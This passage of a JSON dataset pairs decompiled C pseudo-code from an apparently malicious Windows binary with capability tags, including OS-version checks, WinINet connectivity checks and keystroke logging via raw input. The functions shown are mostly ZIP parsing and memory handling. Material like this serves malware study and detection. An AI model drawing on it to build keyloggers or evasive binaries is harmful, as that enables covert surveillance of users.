        "decompiled_code": "\nint32_t __cdecl fcn.00408100(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    if ((*(arg_8h + 0x18) != 0) && (iVar1 = *(arg_8h + 0x10) + 1,  iVar1 != *(arg_8h + 4))) {\n        *(arg_8h + 0x14) = *(arg_8h + 0x14) + *(arg_8h + 0x50) + *(arg_8h + 0x4c) + 0x2e + *(arg_8h + 0x48);\n        *(arg_8h + 0x10) = iVar1;\n        iVar1 = fcn.00407d30(arg_8h, arg_8h + 0x28, arg_8h + 0x78, 0, 0, 0, 0, 0, 0);\n        *(arg_8h + 0x18) = iVar1 == 0;\n        return iVar1;\n    }\n    return -100;\n}\n",
        "token_count": 271
    },
    "00408170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_110h\n\nvoid __cdecl fcn.00408170(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    if ((arg_8h != 0) && (uVar2 = fcn.0042ad20(arg_ch),  uVar2 < 0x100)) {\n        if (*(arg_8h + 0x18) == 0) {\n            fcn.0042a75a(var_110h);\n            return;\n        }\n        arg_8h_00 = *(arg_8h + 0x10);\n        uVar1 = *(arg_8h + 0x14);\n        iVar3 = fcn.004080b0(arg_8h);\n        while( true ) {\n            if (iVar3 != 0) {\n                *(arg_8h + 0x10) = arg_8h_00;\n                *(arg_8h + 0x14) = uVar1;\n                fcn.0042a75a(arg_8h_00);\n                return;\n            }\n            fcn.00407d30(arg_8h, 0, 0, &var_108h, 0x100, 0, 0, 0, 0);\n            if (arg_10h == 1) {\n                iVar3 = fcn.0042baa0(&var_108h);\n            }\n            else {\n                iVar3 = fcn.00407b00(&var_108h, arg_ch);\n            }\n            if (iVar3 == 0) break;\n            iVar3 = fcn.00408100(arg_8h);\n        }\n        fcn.0042a75a(arg_8h_00);\n        return;\n    }\n    fcn.0042a75a(var_110h);\n    return;\n}\n",
        "token_count": 494
    },
    "00408280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408280(char **arg_8h, int32_t *arg_ch, char **arg_10h, uint *arg_14h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    ppcVar3 = arg_8h;\n    iVar5 = 0;\n    *arg_ch = 0;\n    *arg_10h = NULL;\n    *arg_14h = 0;\n    pcVar1 = *arg_8h;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = arg_8h[3] + arg_8h[0x1e];\n    }\n    else {\n        if (pcVar1[1] == '\\0') {\n            return -1;\n        }\n        (**0x462ee8)(*(pcVar1 + 4), arg_8h[3] + arg_8h[0x1e] + *(pcVar1 + 0xc), 0, 0);\n    }\n    iVar4 = fcn.00407a00(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (arg_8h != 0x4034b50) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407960(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407960(*ppcVar3, &var_4h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407960(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if ((iVar5 == 0) && ((ppcVar2 = ppcVar3[0xd],  arg_8h != ppcVar2 || ((ppcVar2 != NULL && (ppcVar2 != 0x8)))))) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407a00(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407a00(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0xf])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407a00(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0x10])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407a00(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0x11])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407960(*ppcVar3, &arg_8h);\n    ppcVar2 = arg_8h;\n    if (iVar4 == 0) {\n        if ((iVar5 == 0) && (arg_8h != ppcVar3[0x12])) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    *arg_ch = *arg_ch + arg_8h;\n    iVar4 = fcn.00407960(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    *arg_10h = ppcVar3[0x1e] + 0x1e + ppcVar2;\n    *arg_14h = arg_8h;\n    *arg_ch = *arg_ch + arg_8h;\n    return iVar5;\n}\n",
        "token_count": 1087
    },
    "00408460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408460(int32_t arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (arg_8h == 0) {\n        return 0xffffff9a;\n    }\n    arg_8h_00 = *(arg_8h + 0x7c);\n    if (arg_8h_00 == NULL) {\n        return 0xffffff9a;\n    }\n    if ((arg_8h_00[0x17] == 0) && (arg_8h_00[0x14] != arg_8h_00[0x15])) {\n        var_4h = 0xffffff97;\n    }\n    if (*arg_8h_00 != 0) {\n        fcn.0042a7fd(*arg_8h_00);\n        *arg_8h_00 = 0;\n    }\n    *arg_8h_00 = 0;\n    if (arg_8h_00[0x10] != 0) {\n        fcn.004076c0(arg_8h_00 + 1);\n    }\n    arg_8h_00[0x10] = 0;\n    fcn.0042a7fd(arg_8h_00);\n    *(arg_8h + 0x7c) = 0;\n    return var_4h;\n}\n",
        "token_count": 323
    },
    "00408c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408c20(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    if (arg_8h == NULL) {\n        *0x452464 = 0x10000;\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x452464 = 0x80000;\n        return;\n    }\n    *0x452464 = fcn.00408b40(arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 138
    },
    "00408c70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408c70(int32_t *arg_8h)\n\n{\n    if (arg_8h == NULL) {\n        return 0;\n    }\n    return arg_8h & 0xffffff00 | *arg_8h == 1;\n}\n",
        "token_count": 63
    },
    "00409cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00409cd0(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (((arg_8h != NULL) && (arg_8h[7] != NULL)) && (*arg_8h != 0)) {\n        uVar1 = *arg_8h[7];\n        if (uVar1 < 0xe) {\n    // WARNING (jumptable): Sanity check requires truncation of jumptable\n            switch(*(uVar1 * 4 + 0x409454)) {\n            case 0x1b9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb08c783:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1045c7c2:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11b60ffc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1b840f00:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x29000006:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x4d8bf84d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe2d3cf8b:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xf87d8300:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xfc4d0100:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        return 0xfffffffe;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 452
    },
    "0040a090": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a090(char *arg_8h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    uint *arg_8h_01;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    iVar3 = 0;\n    if (arg_8h == NULL) {\n        return NULL;\n    }\n    var_88h = NULL;\n    fcn.0042a6e0(&var_84h, 0, 0x7c);\n    var_6ch = fcn.00407b60(arg_8h_00);\n    if (var_6ch == -1) {\ncode_r0x0040a107:\n        iVar3 = -1;\n    }\n    else {\n        if (*arg_8h_00 == '\\0') {\n            *(arg_8h_00 + 0x1c) = var_6ch;\n        }\n        else {\n            if (arg_8h_00[1] == '\\0') goto code_r0x0040a107;\n            (**0x462ee8)(*(arg_8h_00 + 4), *(arg_8h_00 + 0xc) + var_6ch, 0, 0);\n        }\n        iVar1 = fcn.00407a00(arg_8h_00, &arg_8h);\n        if (iVar1 != 0) goto code_r0x0040a107;\n    }\n    var_4h = 0;\n    if (iVar3 == 0) {\n        iVar1 = fcn.00407960(arg_8h_00, &var_4h);\n        if (iVar1 != 0) {\n            iVar3 = -1;\n        }\n    }\n    var_8h = 0;\n    if (iVar3 == 0) {\n        iVar1 = fcn.00407960(arg_8h_00, &var_8h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00407960(arg_8h_00, &var_84h);\n            if (iVar1 == 0) goto code_r0x0040a15c;\n        }\n        iVar3 = -1;\n    }\ncode_r0x0040a15c:\n    arg_8h = NULL;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00407960(arg_8h_00, &arg_8h);\n        if ((((iVar3 == 0) && (arg_8h == var_84h)) && (var_8h == 0)) && (var_4h == 0)) {\n            iVar3 = fcn.00407a00(arg_8h_00, &var_68h);\n            if (iVar3 == 0) {\n                iVar3 = fcn.00407a00(arg_8h_00, &var_64h);\n                if (iVar3 == 0) {\n                    iVar3 = fcn.00407960(arg_8h_00, &var_80h);\n                    if (iVar3 == 0) {\n                        if (var_68h + var_64h <= *(arg_8h_00 + 0xc) + var_6ch) {\n                            var_7ch = ((*(arg_8h_00 + 0xc) - var_68h) - var_64h) + var_6ch;\n                            var_88h = arg_8h_00;\n                            var_ch = 0;\n                            *(arg_8h_00 + 0xc) = 0;\n                            arg_8h_01 = fcn.0042a769(0x80);\n                            puVar2 = &var_88h;\n                            puVar4 = arg_8h_01;\n                            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar4 = *puVar2;\n                                puVar2 = puVar2 + 1;\n                                puVar4 = puVar4 + 1;\n                            }\n                            fcn.004080b0(arg_8h_01);\n                            return arg_8h_01;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (arg_8h_00[0x10] != '\\0') {\n        (**0x462ed0)(*(arg_8h_00 + 4));\n    }\n    fcn.0042a679(arg_8h_00);\n    return NULL;\n}\n",
        "token_count": 1103
    },
    "0040a240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a240(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        return 0xffffff9a;\n    }\n    if (arg_8h[0x1f] != 0) {\n        fcn.00408460(arg_8h);\n    }\n    iVar1 = *arg_8h;\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x10) != '\\0') {\n            (**0x462ed0)(*(iVar1 + 4));\n        }\n        fcn.0042a679(iVar1);\n    }\n    fcn.0042a7fd(arg_8h);\n    return 0;\n}\n",
        "token_count": 169
    },
    "0040a410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a410(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uchar *arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    piVar3 = *(arg_8h + 0x7c);\n    if (piVar3 == NULL) {\n        return -0x66;\n    }\n    if (*piVar3 != 0) {\n        if (arg_10h == 0) {\n            return 0;\n        }\n        piVar3[4] = arg_ch;\n        piVar3[5] = arg_10h;\n        if (piVar3[0x17] < arg_10h) {\n            piVar3[5] = piVar3[0x17];\n        }\n        if (piVar3[5] != 0) {\n            do {\n                if ((piVar3[2] == 0) && (uVar9 = piVar3[0x16],  uVar9 != 0)) {\n                    uVar7 = 0x4000;\n                    if ((uVar9 < 0x4000) && (uVar7 = uVar9,  uVar9 == 0)) {\n                        if (arg_14h != NULL) {\n                            *arg_14h = 1;\n                        }\n                        return 0;\n                    }\n                    pcVar4 = piVar3[0x18];\n                    if (*pcVar4 == '\\0') {\n                        *(pcVar4 + 0x1c) = piVar3[0x1a] + piVar3[0xf];\n                    }\n                    else {\n                        if (pcVar4[1] == '\\0') {\n                            return -1;\n                        }\n                        (**0x462ee8)(*(pcVar4 + 4), *(pcVar4 + 0xc) + piVar3[0x1a] + piVar3[0xf], 0, 0);\n                    }\n                    iVar6 = fcn.004078e0(*piVar3, uVar7, 1, piVar3[0x18]);\n                    if (iVar6 != 1) {\n                        return -1;\n                    }\n                    iVar6 = *piVar3;\n                    piVar3[0xf] = piVar3[0xf] + uVar7;\n                    piVar3[0x16] = piVar3[0x16] - uVar7;\n                    piVar3[1] = iVar6;\n                    piVar3[2] = uVar7;\n                    if ((*(piVar3 + 0x1b) != '\\0') && (uVar9 = 0,  uVar7 != 0)) {\n                        do {\n                            uVar5 = fcn.00407480(piVar3 + 0x1c, *(uVar9 + iVar6));\n                            *(uVar9 + iVar6) = uVar5;\n                            uVar9 = uVar9 + 1;\n                        } while (uVar9 < uVar7);\n                    }\n                }\n                uVar9 = piVar3[2];\n                uVar7 = piVar3[0x1f];\n                if (uVar9 < piVar3[0x1f]) {\n                    uVar7 = uVar9;\n                }\n                if (uVar7 != 0) {\n                    cVar2 = *(piVar3[1] + uVar7 + -1);\n                    piVar3[0x17] = piVar3[0x17] - uVar7;\n                    piVar1 = piVar3 + 0x1f;\n                    *piVar1 = *piVar1 - uVar7;\n                    piVar3[2] = uVar9 - uVar7;\n                    piVar3[1] = piVar3[1] + uVar7;\n                    if ((*piVar1 == 0) && (cVar2 != *(piVar3 + 0x20))) {\n                        return -0x6a;\n                    }\n                }\n                if (piVar3[0x19] == 0) {\n                    uVar9 = piVar3[2];\n                    if (piVar3[5] < piVar3[2]) {\n                        uVar9 = piVar3[5];\n                    }\n                    uVar7 = 0;\n                    if (uVar9 != 0) {\n                        do {\n                            *(uVar7 + piVar3[4]) = *(uVar7 + piVar3[1]);\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 < uVar9);\n                    }\n                    iVar6 = piVar3[4];\n                    iVar8 = fcn.00407320(piVar3[0x14], iVar6, uVar9);\n                    piVar3[0x17] = piVar3[0x17] - uVar9;\n                    piVar3[2] = piVar3[2] - uVar9;\n                    piVar3[5] = piVar3[5] - uVar9;\n                    piVar3[1] = piVar3[1] + uVar9;\n                    piVar3[6] = piVar3[6] + uVar9;\n                    var_4h = var_4h + uVar9;\n                    piVar3[0x14] = iVar8;\n                    piVar3[4] = iVar6 + uVar9;\n                    if ((piVar3[0x17] == 0) && (arg_14h != NULL)) {\n                        *arg_14h = 1;\n                    }\n                }\n                else {\n                    iVar6 = piVar3[4];\n                    iVar8 = piVar3[6];\n                    var_8h = fcn.00409cd0(piVar3 + 1, 2);\n                    iVar8 = piVar3[6] - iVar8;\n                    iVar6 = fcn.00407320(piVar3[0x14], iVar6, iVar8);\n                    piVar3[0x17] = piVar3[0x17] - iVar8;\n                    var_4h = var_4h + iVar8;\n                    piVar3[0x14] = iVar6;\n                    if ((var_8h == 1) || (piVar3[0x17] == 0)) {\n                        if (arg_14h == NULL) {\n                            return var_4h;\n                        }\n                        *arg_14h = 1;\n                        return var_4h;\n                    }\n                    if (var_8h != 0) {\n                        return var_8h;\n                    }\n                }\n            } while (piVar3[5] != 0);\n            if (var_8h != 0) {\n                return var_8h;\n            }\n        }\n        return var_4h;\n    }\n    return -100;\n}\n",
        "token_count": 1637
    },
    "0040a680": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a680(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) || (in_ECX[1] != -1)) {\n        return 0x1000000;\n    }\n    (**0x462eb0)(0x103, in_ECX + 0x50);\n    iVar2 = fcn.0042ad20(in_ECX + 0x50);\n    iVar3 = arg_10h;\n    cVar1 = *(iVar2 + 0x13f + in_ECX);\n    if ((cVar1 != '\\\\') && (cVar1 != '/')) {\n        *(in_ECX + iVar2 + 0x140) = 0x2f;\n    }\n    if (arg_10h == 1) {\n        iVar2 = (**0x462ee8)(arg_8h, 0, 0, 1);\n        if (iVar2 == -1) {\n            return 0x2000000;\n        }\n    }\n    iVar3 = fcn.004077d0(arg_8h, arg_ch, iVar3, &arg_10h);\n    if (iVar3 == 0) {\n        return arg_10h;\n    }\n    iVar3 = fcn.0040a090(iVar3);\n    *in_ECX = iVar3;\n    return (-(iVar3 != 0) & 0xfffffe00) + 0x200;\n}\n",
        "token_count": 361
    },
    "0040afc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040afc0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_8h == NULL) {\n        *0x452464 = 0x10000;\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x452464 = 0x80000;\n        return;\n    }\n    *0x452464 = fcn.0040a750(arg_ch, arg_10h, arg_14h, 3);\n    return;\n}\n",
        "token_count": 130
    },
    "0040b010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b010(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    if (arg_8h == NULL) {\n        *0x452464 = 0x10000;\n        return 0x10000;\n    }\n    if (*arg_8h != 1) {\n        *0x452464 = 0x80000;\n        return 0x80000;\n    }\n    piVar1 = arg_8h[1];\n    if (piVar1[1] != -1) {\n        fcn.00408460(*piVar1);\n    }\n    piVar1[1] = -1;\n    if (*piVar1 != 0) {\n        fcn.0040a240(*piVar1);\n    }\n    *piVar1 = 0;\n    *0x452464 = 0;\n    if (piVar1[0x4e] != 0) {\n        fcn.0042bc28(piVar1[0x4e]);\n    }\n    piVar1[0x4e] = 0;\n    if (piVar1[0x4f] != 0) {\n        fcn.0042bc28(piVar1[0x4f]);\n    }\n    piVar1[0x4f] = 0;\n    fcn.0042a679(piVar1);\n    fcn.0042a679(arg_8h);\n    return *0x452464;\n}\n",
        "token_count": 330
    },
    "0040b410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b410(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h_00 = 7;\n    var_29h._0_1_ = 0;\n    var_34h = 0;\n    iVar1 = (**0x463088)(arg_8h, 7, 0, 0, &var_34h);\n    if ((((iVar1 == 0) && (iVar1 = (**0x463000)(),  uVar3 = var_34h,  iVar1 == 0x7a)) &&\n        (iVar1 = fcn.0042a769(var_34h),  iVar1 != 0)) &&\n       (iVar2 = (**0x463088)(arg_8h, 7, iVar1, uVar3, &var_34h),  iVar2 != 0)) {\n        var_38h = 0;\n        uVar3 = (**0x4630b4)(0x2000e, &var_38h);\n        iVar2 = (**0x462f48)(uVar3);\n        if (iVar2 != 0) {\n            var_30h = 0;\n            iVar2 = (**0x462fb4)(var_38h, 2, &var_30h);\n            if (iVar2 != 0) {\n                var_24h = 0;\n                var_20h = 0;\n                var_1ch = 0;\n                var_18h = 0;\n                stack0xffffffd4 = 0;\n                var_40h = 0;\n                var_44h = 0x14;\n                var_3ch = 0;\n                var_14h = 0x120089;\n                var_10h = 0x120116;\n                var_ch = 0x1200a0;\n                var_8h = 0x1f01ff;\n                (**0x463060)(&arg_ch, &var_14h);\n                iVar2 = (**0x462ed8)(iVar1, var_30h, arg_ch, &var_14h, &var_29h + 1, &var_44h, &var_40h, &var_3ch);\n                if (iVar2 != 0) {\n                    var_29h._0_1_ = var_3ch == 1;\n                }\n                (**0x462ed0)(var_30h);\n            }\n            (**0x462ed0)(var_38h);\n        }\n        fcn.0042a7fd(iVar1);\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 763
    },
    "0040b910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b910(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint *in_ECX;\n    \n    if (arg_ch == 1) {\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_8h) = arg_10h;\n        return;\n    }\n    if (0xf < in_ECX[5]) {\n        in_ECX = *in_ECX;\n    }\n    fcn.0042a6e0(in_ECX + arg_8h, arg_10h, arg_ch);\n    return;\n}\n",
        "token_count": 153
    },
    "0040bd00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040bd00(int32_t **param_1, uchar *param_2, uchar *param_3)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    int32_t *in_FS_OFFSET;\n    uchar *var_8h;\n    uchar *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43d720;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar3 = var_ch_2 + -var_8h;\n    piVar4 = param_1[4];\n    if (((piVar4 <= piVar3) && (param_1[5] != piVar3)) && (cVar2 = fcn.00405d40(piVar3, 1),  cVar2 != '\\0')) {\n        param_1[4] = piVar4;\n        ppiVar5 = param_1;\n        if (0xf < param_1[5]) {\n            ppiVar5 = *param_1;\n        }\n        *(ppiVar5 + piVar4) = 0;\n    }\n    var_4h = 0;\ncode_r0x0040bd70:\n    do {\n        while( true ) {\n            if (var_8h == var_ch_2) {\n                *in_FS_OFFSET = var_ch_3;\n                return;\n            }\n            uVar1 = *var_8h;\n            piVar4 = param_1[4];\n            if (-piVar4 - 1U < 2) {\n                piVar4 = fcn.00429b7e(0x4452ec);\n            }\n            piVar3 = piVar4 + 1;\n            if (piVar3 == 0xffffffff) {\n                piVar4 = fcn.00429b7e(0x4452ec);\n            }\n            if (piVar3 <= param_1[5]) break;\n            fcn.00405ba0(piVar3, piVar4);\n            if (piVar3 != NULL) goto code_r0x0040bdbc;\ncode_r0x0040be4e:\n            var_8h = var_8h + 1;\n        }\n        if (piVar3 == NULL) {\n            param_1[4] = NULL;\n            if (param_1[5] < 0x10) {\n                *param_1 = 0;\n                var_8h = var_8h + 1;\n            }\n            else {\n                **param_1 = 0;\n                var_8h = var_8h + 1;\n            }\n            goto code_r0x0040bd70;\n        }\ncode_r0x0040bdbc:\n        ppiVar5 = param_1;\n        if (0xf < param_1[5]) {\n            ppiVar5 = *param_1;\n        }\n        *(ppiVar5 + param_1[4]) = uVar1;\n        param_1[4] = piVar3;\n        if (param_1[5] < 0x10) {\n            *(param_1 + piVar3) = 0;\n            goto code_r0x0040be4e;\n        }\n        *(*param_1 + piVar3) = 0;\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 821
    },
    "0040dac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
